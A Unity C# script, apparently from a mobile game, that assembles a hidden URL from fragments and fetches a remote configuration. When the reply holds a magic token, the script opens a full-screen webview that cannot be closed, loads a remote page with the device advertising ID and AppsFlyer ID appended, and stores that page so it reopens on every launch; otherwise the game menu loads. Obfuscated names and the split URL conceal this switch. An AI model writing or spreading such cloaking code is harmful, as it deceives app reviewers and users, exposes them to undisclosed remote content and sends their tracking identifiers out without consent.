using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainJOP : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oJOPnamename = "";
    [HideInInspector] public string twJOPnamename = "";


    private void bladeJOPform(string UrlJOPrefer, string NamingJOP = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _attitudesJOP = gameObject.AddComponent<UniWebView>();
        _attitudesJOP.SetToolbarDoneButtonText("");
        switch (NamingJOP)
        {
            case "0":
                _attitudesJOP.SetShowToolbar(true, false, false, true);
                break;
            default:
                _attitudesJOP.SetShowToolbar(false);
                break;
        }
        _attitudesJOP.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _attitudesJOP.OnShouldClose += (view) =>
        {
            return false;
        };
        _attitudesJOP.SetSupportMultipleWindows(true);
        _attitudesJOP.SetAllowBackForwardNavigationGestures(true);
        _attitudesJOP.OnMultipleWindowOpened += (view, windowId) =>
        {
            _attitudesJOP.SetShowToolbar(true);

        };
        _attitudesJOP.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingJOP)
            {
                case "0":
                    _attitudesJOP.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _attitudesJOP.SetShowToolbar(false);
                    break;
            }
        };
        _attitudesJOP.OnOrientationChanged += (view, orientation) =>
        {
            _attitudesJOP.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _attitudesJOP.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlJOPrefer", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlJOPrefer", url);
            }
        };
        _attitudesJOP.Load(UrlJOPrefer);
        _attitudesJOP.Show();
    }





    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaJOP") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oJOPnamename = advertisingId; });
        }
    }
      


    private IEnumerator IENUMENATORJOP()
    {
        using (UnityWebRequest jop = UnityWebRequest.Get(twJOPnamename))
        {

            yield return jop.SendWebRequest();
            if (jop.isNetworkError)
            {
                GoingJOP();
            }
            int plotJOP = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && plotJOP > 0)
            {
                yield return new WaitForSeconds(1);
                plotJOP--;
            }
            try
            {
                if (jop.result == UnityWebRequest.Result.Success)
                {
                    if (jop.downloadHandler.text.Contains("JrnfPlnkGsfrfwe"))
                    {

                        try
                        {
                            var subs = jop.downloadHandler.text.Split('|');
                            bladeJOPform(subs[0] + "?idfa=" + oJOPnamename, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            bladeJOPform(jop.downloadHandler.text + "?idfa=" + oJOPnamename + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        GoingJOP();
                    }
                }
                else
                {
                    GoingJOP();
                }
            }
            catch
            {
                GoingJOP();
            }
        }
    }

    private void GoingJOP()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Menu");
    }

    

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlJOPrefer", string.Empty) != string.Empty)
            {
                bladeJOPform(PlayerPrefs.GetString("UrlJOPrefer"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twJOPnamename += n;
                }
                StartCoroutine(IENUMENATORJOP());
            }
        }
        else
        {
            GoingJOP();
        }
    }

}
